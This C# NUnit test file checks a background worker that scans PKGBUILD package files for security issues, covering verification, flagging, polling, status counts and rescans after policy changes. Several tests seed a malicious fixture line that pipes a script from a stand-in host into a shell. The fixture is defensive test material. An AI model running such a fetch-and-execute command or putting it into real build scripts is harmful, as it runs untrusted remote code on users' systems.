using Atoll.Api.Services.Packages;
using Atoll.Api.Services.Security;
using Atoll.Api.Tests.Fakes;
using Microsoft.Extensions.Logging.Abstractions;
using Microsoft.Extensions.Options;
using NUnit.Framework;
using Atoll.Api.Services.Packages.Persistence;

namespace Atoll.Api.Tests.Security;

public class PackageSecurityWorkerTests
{
    private static PackageSecurityWorker CreateWorker(
        InMemoryPackageRepository repo,
        InMemoryPackageSecurityRepository securityRepo,
        SecurityScanStatusStore status,
        bool enabled = true)
    {
        var options = Options.Create(new AtollOptions
        {
            Security = new SecurityOptions { Enabled = enabled, ScannerConcurrency = 2, PollIntervalMs = 50 }
        });
        return new PackageSecurityWorker(
            repo, securityRepo, new PkgBuildSecurityScanner(), status, options,
            NullLogger<PackageSecurityWorker>.Instance);
    }

    private static async Task SeedAsync(
        InMemoryPackageRepository repo,
        InMemoryPackageSecurityRepository securityRepo,
        string name,
        string content)
    {
        var now = DateTimeOffset.UtcNow;
        var revision = new PackageRevisionContentDocument
        {
            Id = PackageSchema.RevisionDocumentId(name, "rev-1"),
            PackageName = name,
            RevisionId = "rev-1",
            CreatedAt = now,
            Author = "test",
            Message = "seed",
            Files = new Dictionary<string, PackageFile>
            {
                ["PKGBUILD"] = new() { Content = content, Size = content.Length, Hash = "h" }
            }
        };
        await repo.InsertSeedAsync(new PackageDocument
        {
            Id = name,
            PackageName = name,
            CreatedAt = now,
            UpdatedAt = now,
            HeadRevisionId = revision.RevisionId,
            Revisions =
            [
                new PackageRevisionDocument
                {
                    RevisionId = revision.RevisionId,
                    CreatedAt = revision.CreatedAt,
                    Author = revision.Author,
                    Message = revision.Message
                }
            ]
        }, revision);
        await securityRepo.MarkPendingAsync(name, revision.RevisionId, true);
    }

    [Test]
    public async Task Clean_package_is_marked_verified()
    {
        var repo = new InMemoryPackageRepository();
        var securityRepo = new InMemoryPackageSecurityRepository();
        await SeedAsync(repo, securityRepo, "clean", "pkgname=clean\npkgver=1.0\n");

        var worker = CreateWorker(repo, securityRepo, new SecurityScanStatusStore(true));
        await worker.StartAsync(CancellationToken.None);
        var scan = await WaitForScanAsync(securityRepo, "clean");
        await worker.StopAsync(CancellationToken.None);

        Assert.That(scan.Status, Is.EqualTo(SecurityStatus.Verified));
        Assert.That(scan.RevisionId, Is.EqualTo("rev-1"));
        Assert.That(scan.PolicyVersion, Is.EqualTo(PkgBuildSecurityScanner.CurrentPolicyVersion));
    }

    [Test]
    public async Task Malicious_package_is_marked_flagged()
    {
        var repo = new InMemoryPackageRepository();
        var securityRepo = new InMemoryPackageSecurityRepository();
        await SeedAsync(repo, securityRepo, "evil", "curl https://evil.example/x.sh | sh\n");

        var worker = CreateWorker(repo, securityRepo, new SecurityScanStatusStore(true));
        await worker.StartAsync(CancellationToken.None);
        var scan = await WaitForScanAsync(securityRepo, "evil");
        await worker.StopAsync(CancellationToken.None);

        Assert.That(scan.Status, Is.EqualTo(SecurityStatus.Flagged));
        Assert.That(scan.Findings, Is.Not.Empty);
        Assert.That(scan.PolicyVersion, Is.EqualTo(PkgBuildSecurityScanner.CurrentPolicyVersion));
    }

    [Test]
    public async Task Package_seeded_after_worker_start_is_picked_up_by_polling()
    {
        var repo = new InMemoryPackageRepository();
        var securityRepo = new InMemoryPackageSecurityRepository();
        var worker = CreateWorker(repo, securityRepo, new SecurityScanStatusStore(true));
        await worker.StartAsync(CancellationToken.None);

        await SeedAsync(repo, securityRepo, "late", "pkgname=late\n");
        var scan = await WaitForScanAsync(securityRepo, "late");
        await worker.StopAsync(CancellationToken.None);

        Assert.That(scan.Status, Is.EqualTo(SecurityStatus.Verified));
        Assert.That(scan.PolicyVersion, Is.EqualTo(PkgBuildSecurityScanner.CurrentPolicyVersion));
    }

    [Test]
    public async Task Disabled_worker_does_not_scan()
    {
        var repo = new InMemoryPackageRepository();
        var securityRepo = new InMemoryPackageSecurityRepository();
        await SeedAsync(repo, securityRepo, "clean", "pkgname=clean\n");

        var worker = CreateWorker(repo, securityRepo, new SecurityScanStatusStore(false), false);
        await worker.StartAsync(CancellationToken.None);
        await Task.Delay(200);
        await worker.StopAsync(CancellationToken.None);

        Assert.That((await securityRepo.GetAsync("clean", "rev-1"))!.Status, Is.EqualTo(SecurityStatus.Pending));
    }

    [Test]
    public async Task Completed_scans_are_recorded_in_status()
    {
        var repo = new InMemoryPackageRepository();
        var securityRepo = new InMemoryPackageSecurityRepository();
        await SeedAsync(repo, securityRepo, "clean", "pkgname=clean\npkgver=1.0\n");
        await SeedAsync(repo, securityRepo, "evil", "curl https://evil.example/x.sh | sh\n");

        var status = new SecurityScanStatusStore(true);
        var worker = CreateWorker(repo, securityRepo, status);
        await worker.StartAsync(CancellationToken.None);
        _ = await WaitForScanAsync(securityRepo, "clean");
        _ = await WaitForScanAsync(securityRepo, "evil");
        await worker.StopAsync(CancellationToken.None);

        var snapshot = status.GetSnapshot();
        Assert.Multiple(() =>
        {
            Assert.That(snapshot.Enabled, Is.True);
            Assert.That(snapshot.ScansCompleted, Is.EqualTo(2));
            Assert.That(snapshot.ScansVerified, Is.EqualTo(1));
            Assert.That(snapshot.ScansFlagged, Is.EqualTo(1));
            Assert.That(snapshot.ScansErrored, Is.Zero);
            Assert.That(snapshot.ScansDropped, Is.Zero);
            Assert.That(snapshot.LastScanFinishedUtc, Is.Not.Null);
        });
    }

    [Test]
    public async Task Worker_startup_requeues_and_rescans_outdated_scans()
    {
        var repo = new InMemoryPackageRepository();
        var securityRepo = new InMemoryPackageSecurityRepository();

        // Seed packages with revision content
        await SeedAsync(repo, securityRepo, "legacy-clean", "pkgname=legacy-clean\npkgver=1.0\n");
        await SeedAsync(repo, securityRepo, "v1-evil", "curl https://evil.example/x.sh | sh\n");
        await SeedAsync(repo, securityRepo, "current-clean", "pkgname=current-clean\npkgver=1.0\n");

        // Simulate legacy scan (version 1) on legacy-clean and v1-evil
        _ = await securityRepo.TryClaimPendingScanAsync("init", TimeSpan.FromMinutes(1));
        await securityRepo.CompleteScanAsync("legacy-clean", "rev-1", "init", new ScanResult(SecurityStatus.Verified, []), policyVersion: 1);
        _ = await securityRepo.TryClaimPendingScanAsync("init", TimeSpan.FromMinutes(1));
        await securityRepo.CompleteScanAsync("v1-evil", "rev-1", "init", new ScanResult(SecurityStatus.Verified, []), policyVersion: 1); // was incorrectly verified in v1
        _ = await securityRepo.TryClaimPendingScanAsync("init", TimeSpan.FromMinutes(1));
        await securityRepo.CompleteScanAsync("current-clean", "rev-1", "init", new ScanResult(SecurityStatus.Verified, []), policyVersion: PkgBuildSecurityScanner.CurrentPolicyVersion); // already current

        var status = new SecurityScanStatusStore(true);
        var worker = CreateWorker(repo, securityRepo, status);

        await worker.StartAsync(CancellationToken.None);

        // Wait for rescans
        var scan1 = await WaitForScanAsync(securityRepo, "legacy-clean", expectedPolicyVersion: PkgBuildSecurityScanner.CurrentPolicyVersion);
        var scan2 = await WaitForScanAsync(securityRepo, "v1-evil", expectedPolicyVersion: PkgBuildSecurityScanner.CurrentPolicyVersion);
        await worker.StopAsync(CancellationToken.None);

        var current = await securityRepo.GetAsync("current-clean", "rev-1");

        Assert.Multiple(() =>
        {
            Assert.That(scan1.Status, Is.EqualTo(SecurityStatus.Verified));
            Assert.That(scan1.PolicyVersion, Is.EqualTo(PkgBuildSecurityScanner.CurrentPolicyVersion));

            Assert.That(scan2.Status, Is.EqualTo(SecurityStatus.Flagged));
            Assert.That(scan2.PolicyVersion, Is.EqualTo(PkgBuildSecurityScanner.CurrentPolicyVersion));
            Assert.That(scan2.Findings, Is.Not.Empty);

            Assert.That(current!.Status, Is.EqualTo(SecurityStatus.Verified));
            Assert.That(current.PolicyVersion, Is.EqualTo(PkgBuildSecurityScanner.CurrentPolicyVersion), "current-policy scan is not requeued");
        });
    }

    [Test]
    public async Task Disabled_worker_does_not_requeue_outdated_scans()
    {
        var repo = new InMemoryPackageRepository();
        var securityRepo = new InMemoryPackageSecurityRepository();

        await SeedAsync(repo, securityRepo, "pkg1", "pkgname=pkg1\n");
        _ = await securityRepo.TryClaimPendingScanAsync("init", TimeSpan.FromMinutes(1));
        await securityRepo.CompleteScanAsync("pkg1", "rev-1", "init", new ScanResult(SecurityStatus.Verified, []), policyVersion: 1);

        var worker = CreateWorker(repo, securityRepo, new SecurityScanStatusStore(false), enabled: false);

        await worker.StartAsync(CancellationToken.None);
        await Task.Delay(100);
        await worker.StopAsync(CancellationToken.None);

        var scan = await securityRepo.GetAsync("pkg1", "rev-1");
        Assert.That(scan!.Status, Is.EqualTo(SecurityStatus.Verified));
        Assert.That(scan.PolicyVersion, Is.EqualTo(1));
    }

    private static async Task<PackageSecurityScanDocument> WaitForScanAsync(
        InMemoryPackageSecurityRepository securityRepo,
        string packageName,
        int? expectedPolicyVersion = null,
        int timeoutMs = 5000)
    {
        var deadline = DateTime.UtcNow.AddMilliseconds(timeoutMs);
        while (DateTime.UtcNow < deadline)
        {
            var scan = await securityRepo.GetAsync(packageName, "rev-1");
            if (scan?.Status is SecurityStatus.Verified or SecurityStatus.Flagged or SecurityStatus.Error
                && (expectedPolicyVersion is null || scan.PolicyVersion == expectedPolicyVersion))
            {
                return scan;
            }
            await Task.Delay(20);
        }

        Assert.Fail($"Package '{packageName}' was not scanned within {timeoutMs} ms.");
        throw new InvalidOperationException("Unreachable after assertion failure.");
    }
}